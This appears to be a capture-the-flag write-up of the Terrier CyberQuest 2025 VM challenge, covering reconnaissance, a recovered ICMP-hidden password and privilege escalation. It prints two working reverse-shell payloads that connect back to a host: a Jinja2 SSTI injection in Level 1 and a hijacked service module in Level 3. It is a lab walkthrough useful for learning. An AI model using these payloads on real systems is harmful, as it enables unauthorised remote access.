---
title: "Indian Army Terrier CyberQuest 2025"
date: 2025-03-29
layout: writeup
platform: Terrier CyberQuest 2025
categories: [web, pwn, pentesting, rev, forensics, steg]
tags: [web, pwn, pentesting, rev, forensics, steg]
---

# Terrier CyberQuest 2025

Writeups for all the challenges I solved in Terrier CyberQuest 2025
We're given a vm file. I have not solved many "rootme style" boxes like these, so it was quite fun.

## Level 1

First I had to figure out the IP address of the VM. Since we don't have any login credentials, I did an `arp-scan` on my local network to find the IP address of the VM.

Running an nmap scan on the IP address, I found that port 5000 was open.
It had a python web server running.
Static site, not much to see there.

I ran `gobuster` to find any hidden directories.
It found a `/page` directory.

The directory had only a textbox and just echoed back what I typed.
Trying out basic SSTI payloads for jinja2 like `{{ 7*7 }}, I found that it was indeed vulnerable to SSTI.

Exploiting the SSTI vulnerability, I was able to get a reverse shell as the `web-ssti` user.

```py
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.22.78.1\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```

There I found the first flag.

# Level 2

Some basic looking around tells us that there are 3 other users on the system: `flower`, `leaf`, and `stem`.

I had to somehow escalate my privileges to the `flower` user.

I ran linpeas to find any potential privilege escalation vectors.
There was a suspicious looking folder `/network_logs`.

It contained a note and a pcap file.

```
$ cat admin_note.txt
Hello Reader, In this pcap file administrator send the password through a media file and it is password protected .... password also transmitted through network.
```

Now this is where we struggled a bit.
I was immediately able to find the image file in the pcap using wireshark.
It was just an http file transfer.
But I couldn't find the password anywhere in the pcap.

The organizers were kind enough to give us a hint to focus on how users ping each other.
I realized that the password might be hidden in the ICMP packets.
At the end of every ping request, there was a small string of random but readable.
I extracted all those strings and combined them to get the password which was base62 encoded.

Now i was able to get the password for the flower user using OpenStego and ssh into the flower user.
The flag was in the home directory.

# Level 3

Now I had to escalate my privileges to the `leaf` user.
I ran linpeas again to find any potential privilege escalation vectors.
There was a folder called `/handler/` with 2 python files inside.

The files were owned by the `leaf` user but one of the files `handler.py` was writable by our user group.

The `dispatcher.py` file was running as a service and it was importing the `handler.py` file.
It checked if there was any listener open on port 8080 and if there was, it would run the `handler.py` file.

I modified the `handler.py` file to get a reverse shell back to my machine.

```py
import sys,socket,os,pty

s=socket.socket()
s.connect(("172.22.78.1",4444))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
```

I got a reverse shell as the `leaf` user.
The flag was in the home directory again.
